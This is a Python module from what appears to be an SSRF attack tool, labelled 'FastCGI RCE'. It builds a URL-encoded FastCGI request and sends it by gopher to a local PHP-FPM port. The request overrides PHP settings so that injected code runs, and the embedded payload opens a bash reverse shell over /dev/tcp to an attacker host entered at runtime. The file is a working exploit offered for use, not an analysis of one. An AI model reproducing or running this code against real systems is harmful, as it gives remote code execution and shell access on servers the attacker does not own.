from core.utils import *
import logging

name          = "fastcgi"
description   = "FastCGI RCE"
author        = "Unknown"
documentation = []

class exploit():

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        ip   = "127.0.0.1"
        port = "9000"
        data = "%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/SERVER_HOST/SERVER_PORT%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00"
        payload = wrapper_gopher(data, ip , port)
        payload = payload.replace("SERVER_HOST", input("Server Host:"))
        payload = payload.replace("SERVER_PORT", input("Server Port:"))

        r = requester.do_request(args.param, payload)